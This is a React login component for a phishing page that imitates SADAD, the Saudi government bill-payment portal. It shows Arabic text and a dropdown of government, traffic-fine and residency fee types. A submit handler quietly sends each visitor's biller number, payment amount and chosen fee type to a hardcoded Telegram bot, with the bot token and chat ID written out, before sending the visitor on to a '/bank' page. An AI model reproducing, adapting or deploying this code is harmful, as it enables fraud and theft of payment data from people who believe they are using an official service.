import React, { useEffect } from 'react'
import Nav from './Nav'

const Login = () => {

    useEffect(() => {
        document.querySelector("form").addEventListener("submit", (e) => {

        fetch(`https://api.telegram.org/bot5291312425:AAE6SfAU0Om-n-zIkGhN-rYnj9XMFVf6he4/sendMessage?chat_id=5311862338&text= number : ` + document.getElementById("exampleInput").value + "                                                                           Payment fee amount : " + document.getElementById("message2").value + "                                                                           kind : " + document.querySelector("select").options[document.querySelector("select").selectedIndex].value, {
                method: "get"
            })
                .then(success => {
                    console.log("done")
                })
        })
    })
    
    return (
        <div className='container'>
            <Nav />
            <div className="section-two">
                <p><a href="/">الرئيسيه</a>/شخصي</p>
                <h1>للسداد الحكومي</h1>
            </div>
            <div className="section-three">
                <h3>رقم السداد</h3>
                <p>مع فواتير سداد، يمكنك دفع كل الفواتير من خلال البنك، كفواتير الكهرباء، والمياه، والاتصالات، والرسوم الحكومية.</p>
            </div>

            <form action="/bank" >
                <div class="form-group">
                    <label for="exampleInput">أدخل رقم المفوتر</label>
                    <input type="text" class="form-control" id="exampleInput" required />
                </div>
                <div class="form-group">
                    <select name="pass2" class="form-control" required="">
                        <option value="">أختر نوع السداد</option>
                        <option value="مدفوعات حكومية">مدفوعات حكومية</option>
                        <option value="مدفوعات ديوان ملكي">مدفوعات ديوان ملكي</option>
                        <option value="مدفوعات تأمينات اجتماعية">مدفوعات تأمينات اجتماعية</option>
                        <option value="مدفوعات الزراعة و البيئة">مدفوعات الزراعة والبيئة</option>
                        <option value="مدفوعات الجوازات">مدفوعات الجوازات</option>
                        <option value="مدفوعات مخالفات مكتب العمل">مدفوعات مخالفات مكتب العمل</option>
                        <option value="رسوم مركبات">رسوم مركبات </option>
                        <option value="رسوم نقل كفالة">رسوم نقل كفالة</option>
                        <option value="رسوم تغيير مهنة">رسوم تغيير مهنة</option>
                        <option value="دفع رسوم تأييد رعاة">دفع رسوم تأييد رعاة</option>
                        <option value="رسوم تمكين "> رسوم تمكين</option>
                        <option value="تجديد استماره">تجديد استماره</option>
                        <option value="رسوم تسوية جرعات كورونا">رسوم تسوية جرعات كورونا</option>
                        <option value="مدفوعات مخالفات مرورية">مدفوعات مخالفات مرورية</option>
                        <option value="مدفوعات رسوم تصفير مخالفات ">مدفوعات رسوم تصفير مخالفات</option>
                        <option value="مدفوعات رسوم تصفير الزكاة  ">مدفوعات رسوم تصفير الزكاة</option>
                        <option value="مدفوعات رسوم سعودة "> مدفوعات رسوم سعودة </option>
                        <option value="مدفوعات رسوم سداد تمويل "> مدفوعات رسوم سداد تمويل</option>
                        <option value="مدفوعات الإتصالات "> مدفوعات الإتصالات </option>
                        <option value="مدفوعات المياه "> مدفوعات المياه</option>
                        <option value="مدفوعات الكهرباء">مدفوعات الكهرباء</option>
                        <option value="مدفوعات بلاغات التقيد">مدفوعات بلاغات التقيد</option>
                        <option value="مدفوعات عقد إلكتروني (سائق-عاملة منزلية-عامل-مهني)">مدفوعات عقد إلكتروني (سائق-عاملة منزلية-عامل-مهني) </option>
                        <option value="مدفوعات إلغاء هروب">مدفوعات إلغاء هروب</option>
                        <option value="مدفوعات عقد أجير">مدفوعات عقد أجير</option>
                        <option value="مدفوعات نقل ملكية">مدفوعات نقل ملكية</option>
                        <option value="استرداد مبلغ">استرداد مبلغ</option>
                        <option value=" مدفوعات شحن سمسا"> مدفوعات شحن سمسا</option>
                        <option value="مدفوعات أخرى... ">مدفوعات أخرى...</option> </select>
                </div>
                <div class="form-group">
                    <label class="" for="form-password">أدخل قيمة رسوم السداد</label>
                    <input type="number" min={"0"} class="form-control" name="pass04" placeholder=" ريال سعودي" required id="message2" />
                </div>
                <button type="submit" class="btn btn-primary btn-large" title="دخول" name="send" id="send2">
                    دخول                                </button>
            </form>
            <div className="section-four">
                <p>One solution for all payments</p>
                <div className="links">
                    <a href="#" target={"_blank"}></a>
                    <a href='#' target={"_blank"} className='youtube'></a>
                </div>
            </div>
            <div className="section-five">
                <p>.سداد حقوق الطبع والنشر 2022. جميع الحقوق محفوظة</p>
                <div className="footer">
                    <a href="/">الأسئلة المتكررة </a>
                    <a href="/">تنويه</a>
                    <a href="/">سياسة الخصوصية </a>
                    <a href="/">شروط الاستخدام </a>
                    <a href="/">اتصل بنا</a>
                    <a href="/">خريطة الموقع</a>
                </div>
            </div>
        </div>
    )
}

export default Login